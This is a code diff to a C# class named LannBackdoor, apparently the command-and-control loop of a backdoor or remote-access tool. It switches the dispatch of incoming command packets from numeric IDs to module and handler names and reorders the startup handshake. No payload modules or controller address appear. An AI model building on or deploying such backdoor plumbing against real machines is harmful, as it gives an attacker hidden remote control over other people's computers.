@@ -49,20 +49,26 @@ public static class LannBackdoor {
 
         _tcpClient.OnConnect += async (_, _) => {
             Logger.Information("Connected!");
-            await _tcpClient.StartHandlingPackets();
             await _tcpClient.SendPacket(new ClientPacket { Type = PacketType.Ready });
+            _tcpClient.StartHandlingPackets();
+
+            // await Task.Delay(10000);
+            // if (!_tcpClient.IsVerified) {
+            //     Logger.Error("Socket did not verify in 10 seconds!");
+            //     _tcpClient.Dispose();
+            // }
         };
 
         _tcpClient.OnCommand += async (_, data) => {
             Packet packet = data.Packet;
             Logger.Debug("Packet received: {Module}/{Handler}: {@Data}",
-                packet.ModuleId,
-                packet.HandlerId,
+                packet.ModuleName,
+                packet.HandlerName,
                 packet.GetData<object>());
 
-            ModuleInfo? module = ModuleRegistry.Get(packet.ModuleId);
+            ModuleInfo? module = ModuleRegistry.GetByName(packet.ModuleName);
             if (module == null) {
-                Logger.Debug("Unknown module: {Id}", packet.ModuleId);
+                Logger.Debug("Unknown module: {Name}", packet.ModuleName);
                 return;
             }
 
@@ -72,11 +78,11 @@ public static class LannBackdoor {
                 return;
             }
 
-            HandlerInfo? handler = module.GetHandler(packet.HandlerId);
+            HandlerInfo? handler = module.GetHandler(packet.HandlerName);
             if (handler == null) {
                 Logger.Debug("Unknown handler: {Module}/{Id}",
-                    packet.ModuleId,
-                    packet.HandlerId);
+                    packet.ModuleName,
+                    packet.HandlerName);
                 return;
             }
 
@@ -85,8 +91,8 @@ public static class LannBackdoor {
                 await handler.Execute(_tcpClient, packet.GetData<object>(type));
             } catch (Exception e) {
                 Logger.Error("Handler {Module}/{Handler} invocation failed: {Error}",
-                    packet.ModuleId,
-                    packet.HandlerId,
+                    packet.ModuleName,
+                    packet.HandlerName,
                     e.Message);
             }
         };
